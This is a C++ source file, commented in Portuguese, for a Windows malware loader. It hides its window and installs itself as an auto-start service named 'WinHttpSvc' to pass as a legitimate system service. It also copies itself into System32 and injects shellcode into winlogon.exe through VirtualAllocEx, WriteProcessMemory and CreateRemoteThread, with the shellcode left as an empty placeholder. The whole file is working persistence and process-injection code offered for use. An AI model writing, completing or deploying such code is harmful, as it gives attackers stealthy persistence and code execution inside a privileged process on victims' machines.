#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <filesystem>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#define SERVICE_NAME L"WinHttpSvc"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

// Declaração das funções
void ServiceMain(int argc, char* argv[]);
void ControlHandler(DWORD request);
void start(HINSTANCE handle);
bool InjectShellcode(DWORD processId);
void InstallService();
bool IsServiceInstalled();

// Ponto de entrada do aplicativo
int main(int argc, char* argv[]) {
    // Verifica se o serviço está instalado; se não estiver, instala-o.
    if (!IsServiceInstalled()) {
        InstallService();
    }

    // Continua iniciando o serviço normalmente
    SERVICE_TABLE_ENTRY ServiceTable[2] = { { NULL, NULL }, { NULL, NULL } };
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[0].lpServiceName = const_cast<LPWSTR>(SERVICE_NAME);
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

// Função principal do serviço do Windows
void ServiceMain(int argc, char* argv[]) {
    // Inicializa a estrutura de status do serviço
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    // Registra o manipulador de controle para o serviço
    hStatus = RegisterServiceCtrlHandlerW(SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler);

    // Se o registro do manipulador de controle falhar, retorna do serviço
    if (hStatus == (SERVICE_STATUS_HANDLE)NULL)
        return;

    // Inicia a lógica principal do serviço
    start(NULL);
    ExitProcess(0);
}

// Função de manipulação de controle para o serviço
void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        // Trata o pedido de controle de parada
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        // Trata o pedido de controle de desligamento do sistema
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    default:
        // Trata outros pedidos de controle (se houver)
        break;
    }

    return;
}

// Injeta o shellcode em um processo especificado
bool InjectShellcode(DWORD processId) {
    // Abre o processo de destino com todos os direitos de acesso
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        return false;
    }

    // Substitua `shellcode` pelo seu shellcode específico
    unsigned char shellcode[] = { /* shellcode aqui */ };

    SIZE_T shellcodeSize = sizeof(shellcode);

    // Aloca memória dentro do processo de destino e escreve o shellcode
    LPVOID pShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pShellcode == NULL) {
        CloseHandle(hProcess);
        return false;
    }

    // Escreve o shellcode na memória alocada
    if (!WriteProcessMemory(hProcess, pShellcode, shellcode, shellcodeSize, NULL)) {
        VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Cria uma thread remota dentro do processo de destino para executar o shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Fecha o handle da thread e do processo
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

// Lógica principal do serviço: encontra o processo de destino e injeta o shellcode nele
void start(HINSTANCE handle) {
    // Encontra o ID do processo de "winlogon.exe"
    DWORD targetProcessId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (lstrcmpiW(pe32.szExeFile, L"winlogon.exe") == 0) {
                targetProcessId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);

    // Se o processo de destino for encontrado, injeta o shellcode
    if (targetProcessId != 0) {
        if (InjectShellcode(targetProcessId)) {
            // Shellcode injetado com sucesso no processo "winlogon.exe"
        }
        else {
            // Falha ao injetar o shellcode
        }
    }
    else {
        // Processo "winlogon.exe" não encontrado
    }
}

// Instala o serviço do Windows
void InstallService() {
    // Abre o Gerenciador de Controle de Serviços com as permissões adequadas
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        return;
    }

    // Obtém o caminho do executável atual
    wchar_t szPath[MAX_PATH];
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) {
        CloseServiceHandle(hSCManager);
        return;
    }

    // Copia o executável para C:\Windows\System32
    std::wstring targetPath = L"C:\\Windows\\System32\\";
    targetPath += std::filesystem::path(szPath).filename().wstring();
    if (!CopyFile(szPath, targetPath.c_str(), TRUE)) {
        CloseServiceHandle(hSCManager);
        return;
    }

    // Cria uma nova entrada de serviço para o aplicativo
    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        SERVICE_NAME,
        SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        targetPath.c_str(), // Usa o caminho do executável copiado para o serviço
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    // Fecha o handle do serviço e do Gerenciador de Controle de Serviços
    if (hService) {
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
}

// Verifica se o serviço já está instalado
bool IsServiceInstalled() {
    // Abre o Gerenciador de Controle de Serviços com as permissões adequadas
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        return false;
    }

    // Tenta abrir o serviço pelo nome
    SC_HANDLE hService = OpenServiceW(hSCManager, SERVICE_NAME, SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    // Fecha o handle do serviço e do Gerenciador de Controle de Serviços
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}
